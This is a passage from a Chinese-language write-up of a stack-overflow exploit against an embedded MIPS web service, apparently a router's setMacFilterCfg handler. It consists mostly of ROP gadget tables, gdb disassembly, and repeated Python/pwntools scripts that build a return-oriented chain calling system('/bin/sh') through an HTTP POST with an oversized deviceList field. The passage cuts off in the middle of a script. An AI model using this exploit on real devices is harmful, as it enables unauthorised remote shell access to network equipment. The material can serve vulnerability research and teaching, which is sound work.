    |  0x00046900  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046B24  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00046B3C  |  move $a0,$s1   |  jr    $s2                |
    |  0x000479AC  |  move $a0,$s1   |  jalr  $fp                |
    |  0x00048C60  |  move $a0,$s1   |  jr    $s0                |
    |  0x0004AF48  |  move $a0,$s1   |  jalr  $s2                |
    |  0x0004CD78  |  move $a0,$s1   |  jalr  $s5                |
    |  0x00052670  |  move $a0,$s1   |  jalr  $s5                |
    |  0x000532D8  |  move $a0,$s1   |  jalr  $s3                |
    |  0x000554C4  |  move $a0,$s1   |  jalr  $s4                |
    |  0x00055DC0  |  move $a0,$s1   |  jalr  $s2                |
    |  0x00055E20  |  move $a0,$s1   |  jalr  $s3                |
    |  0x00056068  |  move $a0,$s1   |  jalr  $s0                |
    |  0x0005D670  |  move $a0,$s1   |  jalr  $s6                |
    |  0x0005D700  |  move $a0,$s1   |  jalr  $s7                |
    |  0x0005D8C0  |  move $a0,$s1   |  jalr  $s6                |
    |  0x00013B68  |  move $a0,$s1   |  jr    0x24+var_s10($sp)  |
    |  0x00022600  |  move $a0,$s1   |  jr    0x24+var_s8($sp)   |
    |  0x0002DA44  |  move $a0,$s1   |  jr    0xA8+var_s24($sp)  |
    |  0x00031ECC  |  move $a0,$s1   |  jr    0x30+var_s14($sp)  |
    |  0x00040DE0  |  move $a0,$s1   |  jr    0x30+var_sC($sp)   |
    |  0x000415E0  |  move $a0,$s1   |  jr    0x30+var_s14($sp)  |
    |  0x000430EC  |  move $a0,$s1   |  jr    0x60+var_s24($sp)  |
    |  0x0004DCB8  |  move $a0,$s1   |  jr    0x58+var_s24($sp)  |
    |  0x00059FA0  |  move $a0,$s1   |  jr    0x24+var_s18($sp)  |
    |  0x0005D72C  |  move $a0,$s1   |  jr    0x20+var_s24($sp)  |
    --------------------------------------------------------------    
这边我选择了第一个作为gadget2，也就是为自己买下了第二个坑，具体为什么坑，后面执行exp的时候再说。gadget2的内容为：
    .text:0000ABA4                 move    $a0, $s1
    .text:0000ABA8                 move    $t9, $s2
    .text:0000ABAC                 jalr    $t9 ; sub_10DB0
首先我们将exp写到覆盖到gadget1（scandir64）的地址：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
进行动态调试，断点下载rop1处（0x7f524000+0x13444）查看是否成功跳转：
发现成功跳转到了scandir64函数处，disassemble命令查看全部汇编指令，取出其中重要部分：
    0x7f537444 :    lw    ra,68(sp)
    0x7f537448 :    lw    s8,64(sp)
    0x7f53744c :    lw    s7,60(sp)
    0x7f537450 :    lw    s6,56(sp)
    0x7f537454 :    lw    s5,52(sp)
    0x7f537458 :    lw    s4,48(sp)
    0x7f53745c :    lw    s3,44(sp)
    0x7f537460 :    lw    s2,40(sp)
    0x7f537464 :    lw    s1,36(sp)
    0x7f537468 :    lw    s0,32(sp)
    0x7f53746c :    jr    ra
这里发现移动至寄存器中的sp均有偏移，分别为68、64……36、32，通过”x/x $sp + 68”命令查看内存中的值：
目前这里是0，那么如果继续循行程序会将0传给$ra:
发现传参成功，同理后续步骤会对$sXX寄存器进行赋值，有了这些信息之后，需要进行构建payload，需要覆盖到目标地址内容，但是注意，栈存储的顺序是倒序，所以需要先覆盖到$sp+32处，依次放入$s0、$s1、$s2、$s3、$s4、$s5、$s6、$s7、$s8、$ra应该存放的值，然而因为我利用的gadget2  
的特殊性，所以要将$s1中放”/bin/sh”的地址，$s2中放system函数的地址。又因为在执行了跳转之后，sp指向的即为存放返回地址的下一个地址，所以只需要在payload中继续存放32个A即可，修改exp为：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += "A" * 32
        payload += "B" * 4                                          #$s0
        payload += p32(libc_base + next(libc.search("/bin/sh")))    #$s1
        payload += p32(libc_base + sys_off)                         #$s2
        payload += 'B' * 4                                          #$s3
        payload += 'B' * 4                                          #$s4
        payload += 'B' * 4                                          #$s5
        payload += 'B' * 4                                          #$s6
        payload += 'B' * 4                                          #$s7
        payload += "B" * 4                                          #$fp
        payload += p32(libc_base + rop2)                            #$ra
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
还是选择将断点下在了rop1处，进行动态调试：
又发生了非预期的错误，但是仔细一看，是不是觉得这个错误很眼熟？这个错误就是在一开始我们在进行栈溢出偏移量覆盖是第一次出现的错误（覆盖”A” *
500），又停在了这边，那肯定是在覆盖时，覆盖了一些此前存在栈中的数据，导致了栈帧不平衡，开始继续动态调试寻找问题，在寻找问题之前首先分析一下可能出错的位置，首先之前在对返回地址进行覆盖之后是没有任何问题的，所以排除了在返回地址之前非法覆盖导致栈帧不平衡的问题，那么问题肯定是出现在了返回地址之后，一个地址一个地址进行排查，修改exp为：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"
    context.log_level = "debug"
    libc = ELF("libc.so.0")
    def getshell():
        #getshell
        libc_base = 0x7f584320 - 0x60320#0x7f524000
        sys_off = 0x60320 
        rop1 = 0x13444
        rop2 = 0xaba4
        payload = "\r" +  "A" * 472 
        payload += p32(libc_base + rop1)
        payload += "A" * 4 * 1                    
        url = "http://192.168.5.6/goform/setMacFilterCfg"
        cookie = {"Cookie":"password=12345"}
        data = {"macFilterType": "white", "deviceList": payload}   
        requests.post(url, cookies=cookie, data=data)
    try:
        getshell()
    except:
        print("Wrong.")
进行调试：
发现覆盖第一个地址之后，就报错了，看来第一个地址不可以覆盖，再看看报错的原因：
发现这一步是对将$v0中的内容进行传参，但是$v0的地址已经被覆盖成了非法的地址，所以这里就报错了，那么我们将这里覆盖一个合法的栈地址，由于程序没有开aslr，那么就直接将溢出字符串的初始地址作为参数进行传递，修改exp为：
    import requests
    from pwn import *
    context.endian="little"
    context.arch="mips"